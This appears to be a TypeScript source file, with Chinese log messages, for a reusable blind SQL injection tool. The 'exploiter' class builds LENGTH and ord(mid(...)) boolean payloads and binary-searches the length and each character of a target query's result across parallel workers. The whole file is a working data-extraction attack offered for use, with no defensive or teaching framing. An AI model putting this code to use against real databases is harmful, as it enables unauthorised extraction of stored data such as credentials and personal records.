export default class exploiter {
  protected max_threads: number;
  protected _if: (payload: string) => Promise<boolean>;
  protected _build: (payload: string) => string;
  protected _log = console.log;
  protected _patterns;

  constructor({
    checker,
    builder,
    max_threads,
    patterns,
  }: {
    checker: (payload: string) => Promise<boolean>;
    builder: (payload: string) => string;
    max_threads?: number;
    patterns?: {
      lengthGT?: (a: unknown, b: unknown) => string;
      bitGT?: (target: unknown, bit: unknown, mid: number) => string
    };
  }) {
    this._if = checker;
    this._build = builder;
    this.max_threads = max_threads ?? 10;
    this._patterns = Object.assign(
      {
        lengthGT: (a: unknown, b: unknown) => `LENGTH((${a}))>${b}`,
        bitGT: (target: unknown, bit: unknown, mid: number) =>
          `ord(mid((${target}),${bit},1))>'${mid}'`,
      },
      patterns ?? {},
    );
  }

  private async _bruteBit(target: string, bit: number) {
    let left = 32;
    let right = 127;
    let mid: number;
    while (left < right) {
      mid = Math.floor((left + right) / 2);
      if (await this._if(this._build(this._patterns.bitGT(target, bit, mid))))
        left = mid + 1;
      else right = mid;
    }
    return String.fromCharCode(left);
  }

  private async _bruteLength(target: string) {
    let right = 10;
    while (true) {
      if (await this._if(this._build(this._patterns.lengthGT(target, right))))
        right *= 10;
      else break;
    }
    let left = 0;
    let mid: number;
    while (left < right) {
      mid = Math.floor((left + right) / 2);
      if (await this._if(this._build(this._patterns.lengthGT(target, mid))))
        left = mid + 1;
      else right = mid;
    }
    return left;
  }

  async runSqli(target: string) {
    this._log(`[*] 开始对目标 ${target} 进行 SQL 注入盲注...`);
    this._log("[*] 正在爆破长度...");
    const length = await this._bruteLength(target);
    this._log(`[+] 爆破长度完成，长度为 ${length}`);
    const res: string[] = new Array(length).fill("?");
    const pending = Array.from({ length }, (_, i) => i + 1); // range [1, length]
    const pool: Promise<string>[] = [];
    function _wrap(
      bit: number,
      brute: (target: string, bit: number) => Promise<string>,
      _log = console.log,
    ) {
      return new Promise<string>((resolve) => {
        brute(target, bit).then((b) => {
          res[bit - 1] = b;
          const _next = pending.shift();
          if (_next !== undefined) {
            pool.push(_wrap(_next, brute, _log));
          }
          _log(`[+] 已完成爆破 ${bit}/${length} 位，当前结果：${res.join("")}`);
          resolve(b);
        });
      });
    }
    for (let i = 0; i < this.max_threads; i++) {
      const bit = pending.shift();
      if (bit === undefined) break;
      pool.push(_wrap(bit, this._bruteBit.bind(this)));
    }
  }
}
